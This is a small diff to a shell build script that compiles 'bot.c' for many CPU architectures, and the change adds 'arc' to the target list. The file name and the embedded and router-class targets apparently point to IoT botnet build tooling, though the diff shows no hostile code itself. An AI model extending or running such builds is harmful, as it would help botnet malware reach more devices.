@@ -4,7 +4,7 @@
 SOURCE="bot.c"
 
 # List of architectures (based on your folders)
-ARCHS=(i486 i586 i686 m68k mips mipsel powerpc sh4 sparc \
+ARCHS=(arc i486 i586 i686 m68k mips mipsel powerpc sh4 sparc \
        armv4l armv5l armv6l armv7l powerpc-440fp x86_64)
 
 echo "Starting build for: ${ARCHS[*]}"
